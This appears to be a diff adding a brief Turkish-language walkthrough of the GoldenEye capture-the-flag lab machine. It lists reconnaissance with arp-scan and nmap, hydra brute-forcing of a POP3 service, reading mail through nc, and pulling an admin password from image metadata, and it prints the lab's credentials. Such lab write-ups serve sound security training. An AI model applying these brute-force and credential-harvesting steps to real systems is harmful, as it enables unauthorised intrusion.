@@ -1,0 +1,14 @@
+GOLDEN EYE MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.135 bulundu.
+2 - nmap -A -p- 192.168.2.135
+3 - view-source:http://192.168.2.135/terminal.js, users: boris, natalya | boris : InvincibleHack3r
+4 - http://192.168.2.135/sev-home/, boris : InvincibleHack3r, pop3 = 55007
+5 - hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt pop3://192.168.2.135 -s 55007
+6 - nc 192.168.2.135 55007, USER natalya, PASS bird, RETR 2, xenia : RCP90rulez!
+7 - nano /etc/hosts, 192.168.2.135 severnaya-station.com
+8 - http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5, User: doak
+9 - hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://192.168.2.135 -s 55007, doak : goat
+10 - nc 192.168.2.135 55007, USER doak, PASS goat, RETR 1, dr_doak : 4England!
+11 - http://severnaya-station.com/gnocertdir/user/files.php, cat s3cret.txt,
+12 - http://severnaya-station.com/dir007key/for-007.jpg
+13 - exiftool for-007.jpg, echo hash | base64 -d, admin : xWinter1995x!
